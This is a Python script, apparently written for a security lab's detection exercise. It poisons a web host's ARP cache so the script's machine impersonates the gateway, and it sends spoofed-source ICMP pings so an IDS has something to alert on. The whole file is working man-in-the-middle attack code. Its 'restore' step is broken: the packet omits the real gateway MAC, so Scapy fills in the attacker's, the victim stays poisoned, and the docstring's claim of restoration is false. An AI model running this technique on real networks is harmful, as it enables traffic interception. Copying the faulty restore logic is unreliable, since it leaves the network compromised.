#!/usr/bin/env python3
"""Lab ARP cache-poisoning demo (scenario 3).

Confined to the sentrix_lab network: it tells the web target that the attacker
is the gateway, which is the classic man-in-the-middle setup. It runs for a few
rounds, then restores the real mapping. Because the poisoning itself is layer 2
and not visible to signature IDS rules, it also emits a short ICMP sweep from
the MITM position (source 172.30.0.67) so there is a layer-3 signal Suricata can
alert on. See evaluation.md for the detection-gap discussion.

Hardcoded to lab addresses; refuses to run against anything else.
"""
import sys
import time

from scapy.all import ARP, ICMP, IP, Ether, conf, get_if_hwaddr, sendp

LAB_PREFIX = "172.30.0."
GATEWAY = "172.30.0.1"
VICTIM = "172.30.0.21"      # target-web
MITM_SRC = "172.30.0.67"    # spoofed source for the companion ICMP signal
ROUNDS = 6

for addr in (GATEWAY, VICTIM):
    if not addr.startswith(LAB_PREFIX):
        sys.exit(f"refusing: {addr} is outside the lab network {LAB_PREFIX}0/24")

iface = conf.iface
attacker_mac = get_if_hwaddr(iface)
print(f"[*] interface {iface}, attacker MAC {attacker_mac}")
print(f"[*] poisoning {VICTIM}: claiming to be gateway {GATEWAY}")

# Gratuitous ARP replies: "the gateway is at my MAC" (broadcast within the lab).
poison = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc=GATEWAY, hwsrc=attacker_mac, pdst=VICTIM
)
for i in range(ROUNDS):
    sendp(poison, iface=iface, verbose=False)
    print(f"    round {i + 1}/{ROUNDS}: sent gratuitous ARP reply")
    time.sleep(0.3)

print(f"[*] emitting companion ICMP sweep from MITM position {MITM_SRC}")
for host in range(20, 23):
    pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / IP(
        src=MITM_SRC, dst=f"{LAB_PREFIX}{host}"
    ) / ICMP()
    sendp(pkt, iface=iface, verbose=False)
    print(f"    ping -> {LAB_PREFIX}{host}")
    time.sleep(0.2)

# Restore: broadcast the real mapping again so the lab returns to normal.
print("[*] restoring real ARP mapping")
restore = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2, psrc=GATEWAY, pdst=VICTIM
)
sendp(restore, iface=iface, count=3, verbose=False)
print("[+] done")
